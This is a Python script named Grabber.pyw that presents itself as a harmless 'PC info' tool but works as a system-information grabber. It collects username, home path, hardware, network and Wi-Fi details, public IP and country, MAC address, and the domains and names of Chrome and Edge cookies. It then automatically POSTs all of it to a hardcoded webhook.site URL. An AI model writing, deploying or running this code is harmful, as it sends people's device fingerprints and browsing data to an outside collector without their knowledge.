#!/usr/bin/env python3
"""PC Info Script (minimal dependencies, standard library only)

Features:
- Betriebssystem-Infos (Name, Version, Architektur)
- Benutzername & Home-Verzeichnis
- CPU-Infos (Kerne, Architektur)
- RAM (gesamt & frei)
- Laufwerke & freier Speicher
- Standard-Gateway (Best-Effort)
- DNS-Server (Best-Effort)
- Zeitstempel
- Script-Version
- Uptime (Betriebszeit)
- Akku-Status (falls vorhanden)
- Netzwerk-Interface-Liste
- Public IP + Land
- Hostname
- Private IP (best-effort)
- Public IP (HTTPS)
- MAC address (best-effort)
- Wi‑Fi info (SSID + interface; best-effort, OS-specific)
- Cookies viewer (Chrome & Edge, Windows): domains + cookie names (NO values)
- Prints to console
- Saves everything to pc_info.txt
- Sends TEXT (not file) to webhook.site via HTTP POST

Notes:
- Uses ONLY Python standard library
- webhook.site is ideal for school/VPN networks and debugging

Run:
  python Grabber.pyw

Tests:
  python Grabber.pyw --selftest
"""

from __future__ import annotations

import ctypes
import datetime
import getpass
import json
import os
import platform
import shutil
import socket
import string
import uuid
import subprocess
import urllib.request
import urllib.error
import sys
import sqlite3
from collections import defaultdict
from typing import Dict, List, Tuple

# -----------------
# CONFIG
# -----------------
WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
SCRIPT_VERSION = "1.4.0"


# -----------------
# DATA COLLECTION
# -----------------


def format_bytes(num: float) -> str:
    step = 1024.0
    units = ["B", "KB", "MB", "GB", "TB", "PB"]
    size = float(num)
    for unit in units:
        if size < step:
            return f"{size:.1f} {unit}" if unit != "B" else f"{int(size)} {unit}"
        size /= step
    return f"{size:.1f} PB"


def get_os_info() -> Dict[str, str]:
    return {
        "name": platform.system() or "unbekannt",
        "version": platform.version() or "unbekannt",
        "arch": platform.machine() or "unbekannt",
    }


def get_user_info() -> Dict[str, str]:
    try:
        username = getpass.getuser()
    except Exception:
        username = "unbekannt"
    return {"username": username, "home": os.path.expanduser("~") or "unbekannt"}


def get_cpu_info() -> Dict[str, str]:
    return {
        "cores": str(os.cpu_count() or "unbekannt"),
        "arch": platform.machine() or "unbekannt",
    }


def _ram_windows() -> Tuple[int, int] | Tuple[None, None]:
    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return int(stat.ullTotalPhys), int(stat.ullAvailPhys)
    except Exception:
        pass
    return None, None


def _ram_linux() -> Tuple[int, int] | Tuple[None, None]:
    total = available = None
    try:
        with open("/proc/meminfo", "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    parts = line.split()
                    total = int(parts[1]) * 1024
                elif line.startswith("MemAvailable:"):
                    parts = line.split()
                    available = int(parts[1]) * 1024
                if total is not None and available is not None:
                    break
    except OSError:
        return None, None
    return total, available


def _ram_macos() -> Tuple[int, int] | Tuple[None, None]:
    try:
        total_raw = run_cmd(["sysctl", "-n", "hw.memsize"]).strip()
        total = int(total_raw) if total_raw else None
    except Exception:
        total = None

    free = None
    try:
        out = run_cmd(["vm_stat"])
        page_size = os.sysconf("SC_PAGE_SIZE") if hasattr(os, "sysconf") else 4096
        free_pages = 0
        for line in out.splitlines():
            if ":" not in line:
                continue
            key, value = line.split(":", 1)
            if key.strip() in {"Pages free", "Pages inactive"}:
                try:
                    free_pages += int(value.strip().strip("."))
                except ValueError:
                    continue
        if free_pages:
            free = free_pages * page_size
    except Exception:
        pass
    return total, free


def get_ram_info() -> Tuple[str, str]:
    total = free = None
    if sys.platform.startswith("win"):
        total, free = _ram_windows()
    elif sys.platform.startswith("linux"):
        total, free = _ram_linux()
    elif sys.platform == "darwin":
        total, free = _ram_macos()

    total_str = format_bytes(total) if total is not None else "unbekannt"
    free_str = format_bytes(free) if free is not None else "unbekannt"
    return total_str, free_str


def get_storage_info() -> List[Tuple[str, str, str]]:
    paths = []
    seen = set()

    if os.name == "nt":
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                paths.append(drive)
    else:
        paths.extend([os.path.abspath(os.sep), os.path.expanduser("~")])

    entries: List[Tuple[str, str, str]] = []
    for p in paths:
        key = os.path.abspath(p)
        if key in seen:
            continue
        seen.add(key)
        try:
            usage = shutil.disk_usage(p)
            entries.append((key, format_bytes(usage.free), format_bytes(usage.total)))
        except OSError:
            continue
    return entries


def get_default_gateway() -> str:
    if sys.platform.startswith("linux"):
        out = run_cmd(["ip", "route"])
        for line in out.splitlines():
            if line.startswith("default "):
                parts = line.split()
                if len(parts) >= 3:
                    return parts[2]
    elif sys.platform.startswith("win"):
        out = run_cmd(["ipconfig"])
        for line in out.splitlines():
            if "Default Gateway" in line:
                if ":" in line:
                    candidate = line.split(":", 1)[1].strip()
                    if candidate:
                        return candidate
    elif sys.platform == "darwin":
        out = run_cmd(["route", "-n", "get", "default"])
        for line in out.splitlines():
            if "gateway:" in line:
                return line.split("gateway:", 1)[1].strip()
    return "unbekannt"


def get_dns_servers() -> List[str]:
    servers: List[str] = []
    if sys.platform.startswith("win"):
        out = run_cmd(["ipconfig", "/all"])
        collecting = False
        for line in out.splitlines():
            stripped = line.strip()
            if "DNS-Server" in stripped or "DNS Servers" in stripped:
                collecting = True
                parts = stripped.split(":", 1)
                if len(parts) == 2 and parts[1].strip():
                    servers.append(parts[1].strip())
                continue
            if collecting and stripped:
                if stripped[0].isdigit():
                    servers.append(stripped)
                else:
                    collecting = False
    else:
        try:
            with open("/etc/resolv.conf", "r", encoding="utf-8") as f:
                for line in f:
                    if line.startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2:
                            servers.append(parts[1])
        except OSError:
            pass

    return servers if servers else ["unbekannt"]


def get_uptime_seconds() -> int | None:
    if sys.platform.startswith("win"):
        try:
            GetTickCount64 = ctypes.windll.kernel32.GetTickCount64  # type: ignore[attr-defined]
            GetTickCount64.restype = ctypes.c_ulonglong
            ms = int(GetTickCount64())
            return ms // 1000
        except Exception:
            return None

    if sys.platform.startswith("linux"):
        try:
            with open("/proc/uptime", "r", encoding="utf-8") as f:
                first = f.read().split()[0]
                return int(float(first))
        except Exception:
            return None

    if sys.platform == "darwin":
        try:
            raw = run_cmd(["sysctl", "-n", "kern.boottime"])
            # Expected format: { sec = 1700000000, usec = 0, ... }
            if "sec" in raw:
                for part in raw.split(","):
                    if "sec" in part:
                        sec_str = "".join(ch for ch in part if ch.isdigit())
                        if sec_str:
                            boot_ts = int(sec_str)
                            return int(datetime.datetime.now().timestamp() - boot_ts)
        except Exception:
            return None

    return None


def format_duration(seconds: int | None) -> str:
    if seconds is None:
        return "unbekannt"
    if seconds < 0:
        return "unbekannt"

    days, rem = divmod(seconds, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, _ = divmod(rem, 60)

    parts = []
    if days:
        parts.append(f"{days} Tage")
    if hours:
        parts.append(f"{hours} Stunden")
    if minutes or not parts:
        parts.append(f"{minutes} Minuten")
    return ", ".join(parts)


def get_battery_info() -> Dict[str, str]:
    info = {"status": "unbekannt", "percent": "unbekannt"}

    if sys.platform.startswith("win"):
        try:
            class SYSTEM_POWER_STATUS(ctypes.Structure):
                _fields_ = [
                    ("ACLineStatus", ctypes.c_ubyte),
                    ("BatteryFlag", ctypes.c_ubyte),
                    ("BatteryLifePercent", ctypes.c_ubyte),
                    ("Reserved1", ctypes.c_ubyte),
                    ("BatteryLifeTime", ctypes.c_ulong),
                    ("BatteryFullLifeTime", ctypes.c_ulong),
                ]

            status = SYSTEM_POWER_STATUS()
            if ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status)):
                flags = status.BatteryFlag
                if flags == 128:
                    info["status"] = "Keine Batterie"
                else:
                    info["status"] = "Lädt" if status.ACLineStatus == 1 else "Entlädt"
                    if status.BatteryLifePercent <= 100:
                        info["percent"] = f"{status.BatteryLifePercent}%"
        except Exception:
            return info

    elif sys.platform.startswith("linux"):
        base = "/sys/class/power_supply"
        try:
            for entry in os.listdir(base):
                if entry.startswith("BAT"):
                    stat_path = os.path.join(base, entry, "status")
                    cap_path = os.path.join(base, entry, "capacity")
                    status_val = None
                    cap_val = None
                    try:
                        with open(stat_path, "r", encoding="utf-8") as f:
                            status_val = f.read().strip()
                    except OSError:
                        pass
                    try:
                        with open(cap_path, "r", encoding="utf-8") as f:
                            cap_val = f.read().strip()
                    except OSError:
                        pass
                    if status_val:
                        info["status"] = status_val
                    if cap_val:
                        info["percent"] = f"{cap_val}%"
                    return info
        except Exception:
            return info

    elif sys.platform == "darwin":
        raw = run_cmd(["pmset", "-g", "batt"])
        for line in raw.splitlines():
            if "%" in line:
                parts = line.split(";")
                if len(parts) >= 2:
                    percent_part = parts[0]
                    status_part = parts[1]
                    percent_digits = "".join(ch for ch in percent_part if ch.isdigit())
                    if percent_digits:
                        info["percent"] = f"{percent_digits}%"
                    info["status"] = status_part.strip()
                    return info

    return info


def get_network_interfaces() -> List[str]:
    try:
        return sorted({name for _, name in socket.if_nameindex()})
    except Exception:
        return []


def get_public_ip_with_country(timeout: float = 5.0) -> Tuple[str, str]:
    try:
        with urllib.request.urlopen("https://ipapi.co/json/", timeout=timeout) as r:
            data = json.loads(r.read().decode("utf-8", errors="replace"))
            ip = data.get("ip") or "unbekannt"
            country = data.get("country_name") or data.get("country") or "unbekannt"
            return ip, str(country)
    except Exception:
        pass

    # Fallback to plain IP lookup
    return get_public_ip(timeout), "unbekannt"

def get_hostname() -> str:
    return socket.gethostname()


def get_private_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # UDP connect doesn't send packets; OS picks outbound interface.
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        try:
            return socket.gethostbyname(socket.gethostname())
        except OSError:
            return "unbekannt"
    finally:
        try:
            s.close()
        except Exception:
            pass


def get_public_ip(timeout: float = 5.0) -> str:
    urls = ["https://api.ipify.org", "https://checkip.amazonaws.com"]
    for url in urls:
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                return r.read().decode("utf-8", errors="replace").strip()
        except Exception:
            pass
    return "unbekannt"


def get_mac_address() -> str:
    mac = uuid.getnode()
    # If multicast bit set, uuid.getnode() likely returned a random MAC.
    if (mac >> 40) & 1:
        return "unbekannt"
    return ":".join(f"{(mac >> i) & 0xFF:02x}" for i in range(40, -1, -8))


def run_cmd(cmd: List[str]) -> str:
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace")
    except Exception:
        return ""


def get_wifi_info() -> Dict[str, str]:
    info = {"interface": "unbekannt", "ssid": "unbekannt"}

    if sys.platform.startswith("win"):
        raw = run_cmd(["netsh", "wlan", "show", "interfaces"])
        for line in raw.splitlines():
            s = line.strip()
            if s.startswith("Name") and ":" in s:
                info["interface"] = s.split(":", 1)[1].strip()
            if s.startswith("SSID") and "BSSID" not in s and ":" in s:
                info["ssid"] = s.split(":", 1)[1].strip()

    elif sys.platform.startswith("linux"):
        ssid = run_cmd(["iwgetid", "-r"]).strip()
        if ssid:
            info["ssid"] = ssid
            out = run_cmd(["iwgetid"]).strip()
            if out:
                info["interface"] = out.split()[0]

    elif sys.platform == "darwin":
        airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        raw = run_cmd([airport, "-I"])
        for line in raw.splitlines():
            if " SSID:" in line:
                info["ssid"] = line.split(":", 1)[1].strip()
        info["interface"] = "en0"

    return info


# -----------------
# COOKIES (VIEWER – SAFE, READ‑ONLY)
# -----------------
# NOTE: We intentionally DO NOT read cookie values.
# We only list domains and cookie names/counts for easy viewing.


def _cookie_db_paths_windows() -> Dict[str, str]:
    base = os.path.expandvars(r"%LOCALAPPDATA%")
    return {
        "Chrome": os.path.join(base, r"Google\Chrome\User Data\Default\Network\Cookies"),
        "Edge": os.path.join(base, r"Microsoft\Edge\User Data\Default\Network\Cookies"),
    }


def read_cookies_overview() -> List[str]:
    lines: List[str] = []

    if not sys.platform.startswith("win"):
        return ["Cookies:", "  (Nur Windows unterstützt)"]

    lines.append("Cookies (Übersicht – ohne Werte):")

    for browser, path in _cookie_db_paths_windows().items():
        lines.append(f"{browser}:")

        if not os.path.exists(path):
            lines.append("  (nicht gefunden)")
            continue

        # Copy DB to avoid locking issues
        tmp = path + ".tmp"
        try:
            with open(path, "rb") as src, open(tmp, "wb") as dst:
                dst.write(src.read())
        except Exception:
            lines.append("  (konnte Datenbank nicht lesen)")
            continue

        domain_map: Dict[str, List[str]] = defaultdict(list)
        con = None
        try:
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            cur.execute("SELECT host_key, name FROM cookies")
            for host, name in cur.fetchall():
                domain_map[str(host)].append(str(name))
        except Exception:
            lines.append("  (Fehler beim Lesen der Cookies)")
        finally:
            try:
                if con is not None:
                    con.close()
            except Exception:
                pass
            try:
                os.remove(tmp)
            except Exception:
                pass

        if not domain_map:
            lines.append("  (keine Cookies gefunden)")
            continue

        for domain in sorted(domain_map.keys()):
            names = domain_map[domain]
            lines.append(f"  {domain} ({len(names)} Cookies)")
            for n in sorted(names)[:5]:
                lines.append(f"    - {n}")
            if len(names) > 5:
                lines.append("    - …")

    return lines


# -----------------
# OUTPUT
# -----------------

def build_lines() -> List[str]:
    os_info = get_os_info()
    user_info = get_user_info()
    cpu_info = get_cpu_info()
    total_ram, free_ram = get_ram_info()
    storage_entries = get_storage_info()
    gateway = get_default_gateway()
    dns_servers = get_dns_servers()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    wifi = get_wifi_info()
    uptime_text = format_duration(get_uptime_seconds())
    battery = get_battery_info()
    interfaces = get_network_interfaces()
    public_ip, public_country = get_public_ip_with_country()
    lines: List[str] = [
        "System:",
        f"  OS: {os_info['name']}",
        f"  Version: {os_info['version']}",
        f"  Architektur: {os_info['arch']}",
        "",
        "Uptime:",
        f"  {uptime_text}",
        "",
        "Benutzer:",
        f"  Username: {user_info['username']}",
        f"  Home: {user_info['home']}",
        "",
        "CPU:",
        f"  Kerne (logisch): {cpu_info['cores']}",
        f"  Architektur: {cpu_info['arch']}",
        "",
        "Arbeitsspeicher:",
        f"  Gesamt: {total_ram}",
        f"  Frei: {free_ram}",
        "",
        "Akku:",
        f"  Status: {battery['status']}",
        f"  Prozent: {battery['percent']}",
        "",
        "Speicher:",
    ]

    if storage_entries:
        for path, free, total in storage_entries:
            lines.append(f"  {path}  Frei: {free} / {total}")
    else:
        lines.append("  (keine Daten)")

    lines.extend([
        "",
        "Netzwerk:",
        f"  Gateway: {gateway}",
        "DNS:",
    ])

    for dns in dns_servers:
        lines.append(f"  - {dns}")

    lines.append("")
    lines.append("Netzwerk-Interfaces:")
    if interfaces:
        for name in interfaces:
            lines.append(f"  - {name}")
    else:
        lines.append("  (keine Daten)")

    lines.extend([
        "",
        "Zeit:",
        f"  {timestamp}",
        "",
        "Script:",
        f"  Version: {SCRIPT_VERSION}",
        "",
        f"PC-Name (Hostname): {get_hostname()}",
        f"Private IP: {get_private_ip()}",
        f"Public IP: {public_ip} ({public_country})",
        f"MAC-Adresse: {get_mac_address()}",
        "WLAN:",
        f"  Interface: {wifi['interface']}",
        f"  SSID: {wifi['ssid']}",
        "",
    ])
    lines.extend(read_cookies_overview())
    return lines


def save_txt(lines: List[str], filename: str = "pc_info.txt") -> None:
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def send_text_to_webhook(url: str, lines: List[str]) -> None:
    data = "\n".join(lines).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "text/plain; charset=utf-8"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        _ = resp.read()


# -----------------
# MAIN
# -----------------

def main() -> int:
    lines = build_lines()

    for l in lines:
        print(l)

    try:
        save_txt(lines)
        print("\nGespeichert in pc_info.txt")
    except OSError as e:
        print(f"\n[FEHLER] Konnte pc_info.txt nicht speichern: {e}")
        return 3

    try:
        send_text_to_webhook(WEBHOOK_SITE_URL, lines)
        print("[OK] Text wurde an webhook.site gesendet.")
    except urllib.error.URLError as e:
        print(f"[FEHLER] Netzwerk/DNS Fehler beim Senden: {e}")
        return 1
    except Exception as e:
        print(f"[FEHLER] Senden fehlgeschlagen: {e}")
        return 2

    return 0


# -----------------
# TESTS
# -----------------

def _selftest() -> int:
    import unittest
    import tempfile

    class TestPCInfo(unittest.TestCase):
        def test_save_txt_writes_expected(self):
            with tempfile.TemporaryDirectory() as d:
                p = os.path.join(d, "pc_info.txt")
                save_txt(["a", "b"], p)
                with open(p, "r", encoding="utf-8") as f:
                    self.assertEqual(f.read(), "a\nb")

        def test_build_lines_contains_headers(self):
            lines = build_lines()
            self.assertTrue(any(x.startswith("PC-Name") for x in lines))
            self.assertIn("WLAN:", lines)
            self.assertIn("System:", lines)
            self.assertIn("DNS:", lines)
            self.assertIn("Script:", lines)
            self.assertIn("Uptime:", lines)
            self.assertIn("Akku:", lines)
            self.assertIn("Netzwerk-Interfaces:", lines)

        def test_send_text_to_webhook_bad_url_raises(self):
            # This should raise URLError because host is invalid.
            with self.assertRaises(Exception):
                send_text_to_webhook("https://invalid.invalid/", ["x"])

    suite = unittest.defaultTestLoader.loadTestsFromTestCase(TestPCInfo)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    return 0 if result.wasSuccessful() else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        raise SystemExit(_selftest())

    code = main()

    if os.name == "nt":
        try:
            input("\nEnter drücken zum Beenden...")
        except EOFError:
            pass

    raise SystemExit(code)

